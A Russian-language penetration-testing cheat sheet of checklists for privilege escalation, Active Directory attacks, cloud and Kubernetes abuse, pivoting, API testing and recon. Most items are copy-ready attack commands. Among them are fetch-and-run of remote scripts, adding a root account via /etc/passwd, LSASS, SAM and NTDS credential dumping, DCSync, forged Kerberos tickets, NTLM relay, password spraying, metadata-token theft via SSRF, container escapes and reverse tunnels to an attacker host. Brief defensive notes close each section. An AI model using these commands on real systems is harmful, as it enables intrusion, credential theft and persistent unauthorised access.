# Чек-листы: инфраструктура / пост-эксплуатация (batch 3, 2025-2026)

> Под HTB/internal/bug-bounty: privesc, Active Directory, cloud, pivoting, API. Пункты с inline-`code` копируются кликом.

---

## 1. Linux Privilege Escalation

**Быстрый автоэнум**
- [ ] Закинуть и прогнать LinPEAS с полным охватом: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` или локально `./linpeas.sh -a 2>&1 | tee linpeas.out` (флаг `-a` = all checks)
- [ ] Базовый контекст: `id; sudo -l; uname -a; cat /etc/os-release; hostname; ip a` — юзер, группы, версия ядра, дистрибутив
- [ ] Динамика без root: `./pspy64` (палит cron/таймеры и креды в argv процессов), доп. `./lse.sh -l1`

**SUID/SGID и capabilities**
- [ ] SUID: `find / -perm -4000 -type f 2>/dev/null`; SGID: `find / -perm -2000 -type f 2>/dev/null` — каждый нестандартный бинарь по GTFOBins (раздел SUID); классика: `find`, `nmap --interactive`, `vim`, `bash -p`, `env`, `cp`/`tee` на `/etc/passwd`
- [ ] Capabilities: `getcap -r / 2>/dev/null` — ищем `cap_setuid+ep` (`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`), `cap_dac_read_search`, `cap_sys_admin`

**sudo-вектор**
- [ ] Разбор `sudo -l`: каждую разрешённую команду через GTFOBins (раздел Sudo); `(ALL) NOPASSWD` на `vim`/`less`/`awk`/`find`/`tar` = мгновенный root
- [ ] `env_keep`/`LD_PRELOAD`: если в `sudo -l` есть `env_keep+=LD_PRELOAD`, собрать `.so` с `_init()` → `sudo LD_PRELOAD=/tmp/x.so <команда>`
- [ ] Версия: `sudo --version` → Baron Samedit (CVE-2021-3156, sudo < 1.9.5p2), sudoedit (CVE-2023-22809, инъекция через `EDITOR=vim -- /etc/sudoers`)

**Cron, таймеры, PATH**
- [ ] Cron: `cat /etc/crontab; ls -la /etc/cron.*; crontab -l` — скрипты с правом записи (`find / -writable -name '*.sh' 2>/dev/null`), wildcard-инъекции (`tar`/`rsync`), относительный PATH
- [ ] systemd-таймеры: `systemctl list-timers --all`; права на unit'ы: `find /etc/systemd/ -writable 2>/dev/null`

**Writable-цели**
- [ ] Записываемый `/etc/passwd`: `echo 'pwn:$(openssl passwd -1 -salt x pass):0:0::/root:/bin/bash' >> /etc/passwd` затем `su pwn`; проверить `/etc/shadow`, `/etc/sudoers.d/`
- [ ] Writable PATH/бинарь сервиса: `echo $PATH` (есть `.`/writable-каталог раньше системного?); `find / -perm -o+w -type f 2>/dev/null`

**Ядро, контейнеры, NFS**
- [ ] Ядро → эксплойт: `uname -r` → `searchsploit linux kernel <версия>`; актуальное: DirtyPipe (CVE-2022-0847, 5.8–5.16.11), PwnKit/pkexec (CVE-2021-4034, почти универсален), GameOver(lay) Ubuntu (CVE-2023-2640/32629)
- [ ] Группы из `id`: `docker` (`docker run -v /:/mnt -it alpine chroot /mnt sh`), `lxd`/`lxc` (privileged alpine), `disk` (debugfs к `/dev/sda`)
- [ ] NFS `no_root_squash`: на цели `cat /etc/exports`; с атакующей `mount -t nfs target:/share /mnt` → SUID-`bash` от root → на цели `/share/bash -p`

**Реверс по артефактам**
- [ ] Креды/ключи: `cat ~/.bash_history /root/.bash_history 2>/dev/null`; `grep -rinE 'password|passwd|secret|api[_-]?key' /var/www /opt /home 2>/dev/null`; `find / -name id_rsa -o -name authorized_keys 2>/dev/null`; переиспользование пароля для `su root`

**Инструменты:** `linpeas.sh`, `pspy64`, `lse.sh`, `GTFOBins`, `searchsploit`, `linux-exploit-suggester.sh`
**Защита (для репорта):** минимизировать SUID/capabilities, патчить ядро и sudo, sudoers без `NOPASSWD`/`env_keep`, `root_squash` на NFS, аудит cron/прав (`auditd`, least privilege).

---

## 2. Windows Privilege Escalation

**Быстрый автоэнум**
- [ ] WinPEAS: `winPEASx64.exe` (или `winPEASany.exe`); без бинаря: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended"`
- [ ] Контекст и привилегии: `whoami /all` (ключевое — `whoami /priv`), `systeminfo`, `net localgroup administrators`

**Token-привилегии (Potato/SeBackup/SeDebug)**
- [ ] `SeImpersonatePrivilege`/`SeAssignPrimaryToken` (service/IIS/MSSQL) → `PrintSpoofer64.exe -i -c cmd`, `GodPotato -cmd "cmd /c whoami"` (универсален для .NET, 2019/2022/10/11), `JuicyPotatoNG.exe`
- [ ] `SeBackupPrivilege`/`SeRestorePrivilege` → дамп хайвов: `reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive` → офлайн `secretsdump.py -sam sam.hive -system system.hive LOCAL`
- [ ] `SeDebugPrivilege` → дамп LSASS `procdump.exe -accepteula -ma lsass.exe lsass.dmp` (или `mimikatz sekurlsa::minidump`)

**Сервисы**
- [ ] Unquoted service path: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"` — путь с пробелом без кавычек → подложить `C:\Program.exe`; перезапуск `sc start <svc>`
- [ ] Слабые права: `accesschk.exe -uwcqv "Everyone" *` / `accesschk64.exe -wuvc <service>` — `SERVICE_CHANGE_CONFIG` → `sc config <svc> binPath= "C:\tmp\rev.exe"`

**Реестр и инсталлеры**
- [ ] AlwaysInstallElevated: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` и `HKCU` — если оба `=1`: `msiexec /quiet /qn /i evil.msi` (`msfvenom -p windows/x64/exec ... -f msi`)
- [ ] Автозапуски: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`; права на ключи/сервисы (`accesschk`/`PowerUp`)

**Сохранённые креды**
- [ ] `cmdkey /list` → `runas /savecred /user:admin cmd`; поиск `findstr /si password *.txt *.xml *.config`, `Unattend.xml`/`web.config`, GPP `Groups.xml` (cpassword)
- [ ] DPAPI/менеджеры: `mimikatz dpapi::cred`, `vaultcmd /listcreds:"Windows Credentials" /all`

**Автопроверки и ядро**
- [ ] PowerUp: `powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"` (unquoted paths, ACL сервисов, AlwaysInstallElevated, DLL hijack)
- [ ] Missing patches: `systeminfo > si.txt` → `wes.py si.txt` (wesng) или `Watson.exe`; PrintNightmare (CVE-2021-34527), HiveNightmare/SeriousSAM (CVE-2021-36934, `icacls C:\Windows\System32\config\SAM`)
- [ ] UAC bypass (в группе admin, Medium IL): `fodhelper.exe`/`computerdefaults` через `HKCU\Software\Classes\...\shell\open\command`, или UACME `Akagi64.exe`

**Инструменты:** `winPEASx64.exe`, `PrivescCheck.ps1`, `PowerUp.ps1`/`SharpUp`, `accesschk.exe`, `PrintSpoofer`, `GodPotato`, `JuicyPotatoNG`, `mimikatz`, `procdump`, `secretsdump.py`, `wesng`, `Watson`
**Защита (для репорта):** кавычить пути сервисов, чинить ACL, отключить `AlwaysInstallElevated`, LAPS на локальных админов, убрать лишние токен-привилегии у сервисов, патч-менеджмент, Credential Guard + UAC на максимум.

---

## 3. Active Directory — цепочка атак

**Энумерация без кредов (аноним/null/guest)**
- [ ] SMB-фингерпринт, домен, OS, signing: `nxc smb <ip>` и по подсети `nxc smb <cidr>`
- [ ] Null/guest — шары и политика паролей: `nxc smb <ip> -u '' -p '' --shares --pass-pol`; гость: `nxc smb <ip> -u 'guest' -p '' --shares`
- [ ] Глубокий null-разбор: `enum4linux-ng -A <ip>`
- [ ] RID brute (список юзеров без кредов): `nxc smb <ip> -u '' -p '' --rid-brute 10000` (если null закрыт — `-u 'guest' -p ''`)
- [ ] Anonymous LDAP: `ldapsearch -x -H ldap://<dc> -s base namingContexts`; дамп: `ldapsearch -x -H ldap://<dc> -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName`
- [ ] Kerberos user enum (без пароля): `kerbrute userenum -d corp.local --dc <dc> users.txt`
- [ ] AS-REP roast без аутентификации: `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <dc> -format hashcat`

**С кредами любого пользователя**
- [ ] Валидация (Pwn3d! = локал-админ): `nxc smb <dc> -u u -p 'p'`; LDAP signing/channel-binding печатается прямо в баннере: `nxc ldap <dc> -u u -p 'p'`
- [ ] Граф BloodHound: `bloodhound-python -d corp.local -u u -p 'p' -ns <dc> -c All --zip` (или `nxc ldap <dc> -u u -p 'p' --bloodhound --collection All --dns-server <dc>`)
- [ ] Описания/SPN: `nxc ldap <dc> -u u -p 'p' -M get-desc-users`; SPN: `nxc ldap <dc> -u u -p 'p' --kerberoasting kerb.txt`
- [ ] SYSVOL/шары на пароли (GPP cpassword): `nxc smb <dc> -u u -p 'p' -M gpp_password -M gpp_autologin`

**Kerberos: AS-REP и Kerberoast**
- [ ] AS-REP roast (аутентифицированно): `impacket-GetNPUsers corp.local/u:'p' -dc-ip <dc> -request -format hashcat -outputfile asrep.txt`
- [ ] Kerberoast: `impacket-GetUserSPNs corp.local/u:'p' -dc-ip <dc> -request -outputfile kerb.txt`; с Windows: `Rubeus.exe kerberoast /outfile:kerb.txt /nowrap`
- [ ] Таргетный (writeSPN): `targetedKerberoast.py -d corp.local -u u -p 'p' --dc-ip <dc>`
- [ ] Крек: AS-REP `hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`; TGS-REP RC4 `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule` (AES → `-m 19600/19700`)

**Password spraying (lockout-aware)**
- [ ] Сначала политика: `nxc smb <dc> -u u -p 'p' --pass-pol` (узнать threshold/window!)
- [ ] Спрей одним паролем: `nxc smb <dc> -u users.txt -p 'Corp2025!' --continue-on-success --no-bruteforce` (1 пароль/раунд, ждать сброса окна)
- [ ] Кандидаты: `Winter2025!`, `Spring2026!`, `<Company>1!`, `Welcome1`; user=pass: `nxc smb <dc> -u users.txt -p users.txt --no-bruteforce`

**ACL / BloodHound-пути**
- [ ] ForceChangePassword: `net rpc password 'victim' 'NewP@ss123!' -U 'corp.local/u%p' -S <dc>` (или `bloodyAD --host <dc> -d corp.local -u u -p 'p' set password victim 'NewP@ss123!'`)
- [ ] GenericAll/GenericWrite над юзером → таргетный Kerberoast/shadow creds; над компом → RBCD
- [ ] WriteDACL/owns корень → DCSync себе: `dacledit.py -action write -rights DCSync -principal u -target-dn 'DC=corp,DC=local' corp.local/u:'p'`
- [ ] AddMember в группу: `bloodyAD --host <dc> -d corp.local -u u -p 'p' add groupMember 'Target Group' u`

**Делегирование**
- [ ] Unconstrained: `nxc ldap <dc> -u u -p 'p' --trusted-for-delegation` → на хосте `Rubeus.exe monitor /interval:5 /nowrap` + coerce DC → TGT DC$
- [ ] Constrained (S4U): `impacket-getST -spn cifs/target.corp.local -impersonate administrator -dc-ip <dc> 'corp.local/svc:p'`
- [ ] RBCD: `impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss123!' corp.local/u:'p'` → `impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.local/u:'p'` → `impacket-getST -spn cifs/target.corp.local -impersonate administrator 'corp.local/EVIL$:P@ss123!'`
- [ ] Использовать тикет: `export KRB5CCNAME=administrator.ccache; impacket-wmiexec -k -no-pass corp.local/administrator@target.corp.local`

**ADCS (Certipy)**
- [ ] Найти уязвимые шаблоны/CA: `certipy-ad find -u u@corp.local -p 'p' -dc-ip <dc> -vulnerable -stdout` (ESC1-ESC16)
- [ ] ESC1 (SAN произвольный): `certipy-ad req -u u@corp.local -p 'p' -dc-ip <dc> -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@corp.local` → `certipy-ad auth -pfx administrator.pfx -dc-ip <dc>`
- [ ] ESC8 (Web Enroll + relay): `certipy-ad relay -target 'http://<ca>/certsrv/' -template DomainController` + coerce DC → pfx DC$ → DCSync
- [ ] ESC4 (write на шаблон): `certipy-ad template -u u@corp.local -p 'p' -template 'VulnTemplate' -dc-ip <dc> -write-default-configuration` затем ESC1

**Coercion + relay**
- [ ] Принуждение: `coercer coerce -u u -p 'p' -d corp.local -t <dc> -l <attacker_ip>` или `petitpotam.py -u u -p 'p' -d corp.local <attacker_ip> <dc>` (также `printerbug.py`)
- [ ] Relay на LDAPS (нет signing): `impacket-ntlmrelayx -t ldaps://<dc> --escalate-user u` или `--delegate-access` (RBCD)
- [ ] Relay на ADCS (ESC8): `impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController`
- [ ] Relay на SMB (signing off): сначала `nxc smb <cidr> --gen-relay-list relay.txt`, затем `impacket-ntlmrelayx -tf relay.txt -smb2support`

**Дамп секретов**
- [ ] DCSync: `impacket-secretsdump -just-dc corp.local/administrator@<dc> -hashes :<nthash>` (или `-just-dc-user krbtgt`)
- [ ] Через nxc: `nxc smb <dc> -u administrator -H <nthash> --ntds`
- [ ] Локально (с админ-правами): `nxc smb <host> -u admin -p 'p' --sam --lsa -M lsassy`; gMSA/LAPS: `nxc ldap <dc> -u u -p 'p' --gmsa` / `-M laps`

**Persistence**
- [ ] Golden Ticket: `impacket-ticketer -nthash <krbtgt_nt> -domain-sid <SID> -domain corp.local administrator`
- [ ] Silver Ticket (без DC): `impacket-ticketer -nthash <svc_nt> -domain-sid <SID> -domain corp.local -spn cifs/target.corp.local administrator`
- [ ] Shadow creds: `certipy-ad shadow auto -u u@corp.local -p 'p' -account 'victim' -dc-ip <dc>`

**Lateral movement**
- [ ] Pass-the-Hash по подсети: `nxc smb <cidr> -u administrator -H <nthash>` (локальный — `--local-auth`)
- [ ] Шелл: `evil-winrm -i <host> -u administrator -H <nthash>` / `impacket-psexec` (SYSTEM, шумно) / `impacket-wmiexec` (тише)
- [ ] Overpass-the-Hash: `impacket-getTGT corp.local/administrator -hashes :<nt>` → `export KRB5CCNAME=administrator.ccache` → `impacket-wmiexec -k -no-pass corp.local/administrator@<host>`

**Инструменты:** `nxc` (netexec), `impacket`, `certipy-ad`, `bloodhound-python`/SharpHound, `kerbrute`, `Rubeus`, `bloodyAD`, `dacledit`/`targetedKerberoast`, `coercer`/`petitpotam`, `enum4linux-ng`, `evil-winrm`, `hashcat`
**Защита (для репорта):** LDAP signing + channel binding и SMB signing, отключить null/anonymous и RC4/preauth-less, убрать уязвимые ADCS-шаблоны (ESC1/8), tiering + gMSA/LAPS, мониторинг DCSync/AS-REP/coercion, двойная ротация krbtgt.

---

## 4. Cloud — AWS / Azure / GCP / Kubernetes

**Идентификация (нашли ключи/токен)**
- [ ] AWS — чьи это креды: `aws sts get-caller-identity`
- [ ] AWS — профиль: `aws configure --profile loot` (или `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`)
- [ ] Azure: `az login` затем `az account show` и `az account list -o table`
- [ ] GCP: `gcloud auth activate-service-account --key-file=key.json` затем `gcloud auth list`

**Enumeration и аудит прав**
- [ ] AWS аудит мисконфигов: `scout suite aws` (HTML-отчёт) и/или `prowler aws -p loot`
- [ ] AWS интерактив: `python3 pacu.py` → `import_keys loot` → `run iam__enum_permissions` → `run iam__privesc_scan`
- [ ] AWS свои действия/политики: `aws iam list-attached-user-policies --user-name <me>`, `enumerate-iam`
- [ ] Azure recon AAD: `roadrecon auth -u user@tenant -p pass` → `roadrecon gather` → `roadrecon gui`
- [ ] GCP: `gcloud projects list`, `gcloud projects get-iam-policy <proj>`

**S3 / Storage и секреты**
- [ ] AWS бакеты: `aws s3 ls` → `aws s3 ls s3://<bucket> --recursive` → `aws s3 sync s3://<bucket> ./loot`
- [ ] Публичные без кредов: `aws s3 ls s3://<bucket> --no-sign-request`, `curl https://<bucket>.s3.amazonaws.com/`
- [ ] Секреты в дампе: `trufflehog s3 --bucket=<bucket>` или `trufflehog filesystem ./loot`

**IAM privilege escalation**
- [ ] iam:PassRole + сервис: `aws lambda create-function --role <admin-role> ...` / `aws ec2 run-instances --iam-instance-profile ...`
- [ ] iam:CreatePolicyVersion: `aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default`
- [ ] sts:AssumeRole (в т.ч. cross-account): `aws sts assume-role --role-arn <arn> --role-session-name x`
- [ ] iam:CreateAccessKey/UpdateLoginProfile (persistence): `aws iam create-access-key --user-name <victim>`

**SSRF → Instance Metadata → роль**
- [ ] AWS IMDSv1: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` → `curl .../<role>`
- [ ] AWS IMDSv2: `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")` → `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- [ ] Azure managed identity: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`
- [ ] GCP: `curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`

**Kubernetes — из пода**
- [ ] Токен/CA сервис-аккаунта: `cat /var/run/secrets/kubernetes.io/serviceaccount/token` (+ `ca.crt`, `namespace`)
- [ ] Что разрешает токен: `kubectl auth can-i --list` (цель: `create pods`, `list secrets`, `*`)
- [ ] Авто-enum: `peirates` (интерактив), `kube-hunter --pod`
- [ ] Секреты: `kubectl get secrets -A -o yaml`

**Kubernetes — побег на ноду**
- [ ] Привилегированный под с hostPath `/`: `kubectl run pwn --image=alpine --privileged --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}],"command":["sleep","999999"]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'` → `kubectl exec -it pwn -- chroot /host bash`
- [ ] Смонтированный docker.sock: `docker -H unix:///var/run/docker.sock run -it --privileged --pid=host -v /:/host alpine chroot /host`
- [ ] Privileged-контейнер: `fdisk -l` → `mount /dev/sda1 /mnt && chroot /mnt`

**Инструменты:** `awscli`/`az`/`gcloud`/`kubectl`, ScoutSuite, Prowler, Pacu, CloudFox, ROADtools (`roadrecon`), trufflehog, peirates, kube-hunter, `enumerate-iam`
**Защита (для репорта):** IMDSv2 (hop-limit=1) + резать egress к 169.254.169.254; least-privilege IAM/RBAC (запрет iam:PassRole/CreatePolicyVersion/AssumeRole на широкие роли); блок публичного S3, шифрование, CloudTrail/GuardDuty; k8s — PodSecurity restricted, без privileged/hostPath, `automountServiceAccountToken: false`.

---

## 5. Pivoting и туннелирование

**Разведка внутренних сетей**
- [ ] Интерфейсы/маршруты/соседи: `ip a` / `ip route` (Win: `ipconfig /all`, `route print`), `arp -a`, `cat /etc/hosts`, `cat /etc/resolv.conf`
- [ ] Живые хосты/порты без тулов: `for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i >/dev/null && echo 10.10.10.$i up) & done`; порт через bash: `(echo >/dev/tcp/10.10.10.5/445) 2>/dev/null && echo open`

**Ligolo-ng (основной способ, TUN)**
- [ ] На атакующем: `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up` затем `./proxy -selfcert`
- [ ] На цели (reverse): `./agent -connect <attacker_ip>:11601 -ignore-cert`
- [ ] В консоли: `session` → выбрать агента → `start`; маршрут на атакующем: `sudo ip route add 10.10.20.0/24 dev ligolo`
- [ ] Обратный проброс (listener на агенте → к нам): `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`

**Chisel (HTTP-туннель / нет TUN)**
- [ ] Атакующий — reverse-сервер: `chisel server -p 8080 --reverse`
- [ ] Цель — reverse SOCKS: `chisel client <attacker_ip>:8080 R:socks` (далее `socks5 127.0.0.1 1080` в proxychains)
- [ ] Проброс порта: `chisel client <attacker_ip>:8080 R:3389:10.10.20.5:3389`

**SSH-туннели и proxychains**
- [ ] Динамический SOCKS: `ssh -D 1080 -fN user@<pivot>` + в `/etc/proxychains.conf`: `socks5 127.0.0.1 1080` → `proxychains nmap -sT -Pn 10.10.20.5`
- [ ] Локальный проброс: `ssh -L 8000:10.10.20.5:80 user@<pivot>` (→ `http://127.0.0.1:8000`)
- [ ] Обратный проброс: `ssh -R 9001:127.0.0.1:9001 user@<pivot>`
- [ ] VPN-подобный: `sshuttle -r user@<pivot> 10.10.20.0/24`

**Metasploit / Meterpreter**
- [ ] Маршрут через сессию: `run autoroute -s 10.10.20.0/24` (или `route add 10.10.20.0/24 <session_id>`)
- [ ] SOCKS поверх маршрутов: `use auxiliary/server/socks_proxy` → `set SRVPORT 1080` → `run`
- [ ] Проброс порта: `portfwd add -l 3389 -p 3389 -r 10.10.20.5`

**Socat / двойной pivot**
- [ ] TCP-relay: `socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80`
- [ ] Двойной pivot: цепочка ligolo-агентов или вложенные SOCKS в proxychains (`dynamic_chain`, прокси построчно)

**Инструменты:** ligolo-ng, chisel, OpenSSH (`-L`/`-R`/`-D`), proxychains-ng, sshuttle, socat, Metasploit (`autoroute`/`socks_proxy`/`portfwd`), nmap (`-sT -Pn` через прокси)
**Защита (для репорта):** сегментация и ACL между зонами, egress-фильтрация, мониторинг TUN/долгих reverse-сессий/аномального SOCKS (Zeek/Suricata/EDR), `AllowTcpForwarding no` на SSH.

---

## 6. API Testing (OWASP API Top 10)

**Discovery / спека и поверхность**
- [ ] Найти спеку: `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs`, `/swagger-ui.html`, `/.well-known/openapi.json`
- [ ] GraphQL introspection: `{"query":"query{__schema{types{name fields{name}}}}"}` на `/graphql`, `/api/graphql`, `/query` → выгрузить схему
- [ ] Импорт спеки в Burp (Import OpenAPI)/Postman; скрытые параметры `arjun -u https://target/api/v1/user -m GET,POST`; маршруты `kr scan https://target -w routes.kite`
- [ ] Версии/методы: `/api/v1/..` vs `/api/v2/..` (auth drift), `OPTIONS`, override `X-HTTP-Method-Override: PUT`

**API1 BOLA / IDOR (приоритет $$$)**
- [ ] 2 аккаунта (A,B): объект B токеном A — `GET /api/v1/orders/{id_B}`, `GET /api/users/me?id=victim`
- [ ] Перебор id: `ffuf -u https://target/api/v1/orders/FUZZ -w ids.txt -H "Authorization: Bearer A"`; UUID собирать из других ответов, не угадывать
- [ ] Вложенные/соседние: `/users/{id}/cards`, `/accounts/{id}/transactions`, GraphQL поле-за-полем

**API2 Broken Authentication**
- [ ] Снять токен / протухший / чужой JWT / пустой `Bearer` — где доступ всё равно есть
- [ ] JWT-атаки (см. JWT-чек-лист): `alg:none`, RS256→HS256, слабый секрет `hashcat -m 16500 jwt.txt rockyou.txt`, `kid` traversal/SQLi
- [ ] Логика: брутфорс OTP/`reset-token`, повторное использование кода, нет старого пароля при смене

**API3 Mass Assignment / лишние данные**
- [ ] Привилегированные поля в JSON: `"role":"admin"`, `"isAdmin":true`, `"is_staff":true`, `"verified":true`, `"balance":999999`, `"user_id":<victim>`
- [ ] Excessive data exposure: сравнить сырой JSON с тем, что рендерит UI — `password_hash`, `ssn`, токены, PII в «лишних» полях

**API5 BFLA (приоритет $$$)**
- [ ] Админ-функция обычным юзером: `POST /api/v1/admin/users`, `DELETE /api/v1/users/{id}`, `/internal/*`, `/actuator/*`
- [ ] Сменить метод на привилегированный: `GET`→`PUT`/`PATCH`/`DELETE`; админ-роуты через `v1` если в `v2` закрыто

**API4 / API6 / API7**
- [ ] Rate-limit/ресурсы: 100+ запросов (Intruder/`ffuf`) → `429`?; GraphQL batching и глубокая вложенность (DoS)
- [ ] Бизнес-флоу: автоматизировать дефицитную операцию без анти-автоматизации
- [ ] SSRF в URL-полях (`url`,`callback`,`webhook`,`avatar`,`image_url`): `http://169.254.169.254/latest/meta-data/`, `http://localhost:<port>/`, Collaborator-домен; blind по DNS/HTTP

**Инструменты:** Burp (Repeater/Intruder/Import OpenAPI/Collaborator), `ffuf`, `arjun`, `kiterunner` (`kr`), Postman, `graphql-cop`, `clairvoyance`, `jwt_tool`, `grpcurl` (`grpcurl -plaintext target:port list`)
**Защита (для репорта):** серверная авторизация по объекту и функции на КАЖДЫЙ запрос (deny-by-default), allowlist полей DTO (запрет mass assignment), единый rate-limit/quotas, allowlist исходящих URL против SSRF.

---

## 7. Recon-пайплайн (автоматизация энумерации)

**Scope и подготовка**
- [ ] Зафиксировать scope (in-scope домены/CIDR, wildcard, исключения) в `roots.txt`; держать out-of-scope под рукой
- [ ] Ключи для пассивных источников (`~/.config/subfinder/provider-config.yaml`, `CHAOS_KEY`, amass datasources) — без них охват резко падает

**Пассивный сбор поддоменов**
- [ ] `subfinder -d target.com -all -recursive -silent -o subs_sf.txt`
- [ ] `amass enum -passive -d target.com -o subs_amass.txt`
- [ ] crt.sh: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u`
- [ ] Слить/дедуп: `cat subs_*.txt | sort -u > subs_all.txt` (+ permutations `alterx`)

**Резолв и живые**
- [ ] Резолв: `dnsx -l subs_all.txt -silent -a -resp -o resolved.txt`
- [ ] Живые веб: `httpx -l resolved.txt -title -tech-detect -status-code -ip -silent -o live.txt`

**Порты**
- [ ] Быстро: `naabu -list resolved.txt -top-ports 1000 -silent -o ports.txt`
- [ ] Углублённо: `nmap -sCV -Pn -iL <(cut -d: -f1 ports.txt | sort -u) -oA nmap_out`

**Краулинг, JS, история**
- [ ] Краулинг (JS): `katana -list live.txt -jc -kf all -d 3 -silent -o urls_katana.txt`
- [ ] История: `gau --threads 5 < live.txt > urls_gau.txt`; `cat live.txt | waybackurls > urls_wb.txt`
- [ ] JS и секреты: `getJS --input live.txt --complete | httpx -silent -mc 200 | nuclei -t http/exposures/ -silent`; грепать `api_key`/`token`/`s3` в JS

**Скриншоты и nuclei**
- [ ] Триаж: `gowitness scan file -f live.txt --screenshot-path ./shots`
- [ ] Шаблоны: `nuclei -l live.txt -severity critical,high,medium -es info -rl 150 -o nuclei.txt`; takeover `nuclei -l live.txt -t http/takeovers/`

**Связка и мониторинг**
- [ ] Полный пайп: `subfinder -d target.com -all -silent | dnsx -silent | httpx -silent | nuclei -severity critical,high -silent`
- [ ] Мониторинг новых активов: cron + `anew` (diff) + `notify` (Slack/Discord/Telegram при дельте)

**Инструменты:** ProjectDiscovery (`subfinder`/`dnsx`/`naabu`/`httpx`/`katana`/`nuclei`/`chaos`/`alterx`/`notify`), `amass`, `gau`, `waybackurls`, `getJS`, `gowitness`, `nmap`, `jq`, `anew`
**Защита (для репорта):** минимизировать внешнюю поверхность (закрыть лишние сервисы, dangling DNS), не светить секреты в JS/истории, мониторинг своих активов и периодический external-scan.
